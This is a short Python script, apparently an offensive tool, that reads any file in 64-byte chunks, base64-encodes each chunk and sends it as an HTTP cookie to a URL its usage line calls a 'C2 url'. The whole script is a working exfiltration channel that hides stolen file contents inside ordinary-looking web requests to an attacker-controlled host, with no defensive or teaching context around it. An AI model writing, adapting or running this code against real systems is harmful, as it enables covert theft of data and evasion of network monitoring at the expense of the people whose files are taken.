#!/usr/bin/python3 
	
#import
import sys
import base64
import requests

#functions 
def Cookie_Exfiltration(c,u):
	c_name = ""
	c_value = c
	cookie = {c_name: c_value}
	response = requests.get(u,cookies=cookie)
	print("Status Code:", response.status_code)
	print("-----------------------------------------------------------------------------------")

def Cookie_Maker(file_path, u):
    try:
        with open(file_path, "rb") as f:
            incr = 0
            while chunk := f.read(64):
                hex_chunk = ' '.join(f"{byte:02x}" for byte in chunk)
                hex_chunk = ''.join(hex_chunk.split())
                b64 = bytes.fromhex(hex_chunk)
                b64 = base64.b64encode(b64)
                b64 = b64.decode('utf-8')
                print("Cookie: ",b64)
                Cookie_Exfiltration(b64, u)
                incr += 1
            print("Number of Cookies generated: ",incr)
    except FileNotFoundError:
        print(f"file not found")
    except Exception as e:
        print(f"error")

#main
if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python script.py <file path> <C2 url>")
    else:
        Cookie_Maker(sys.argv[1], sys.argv[2])
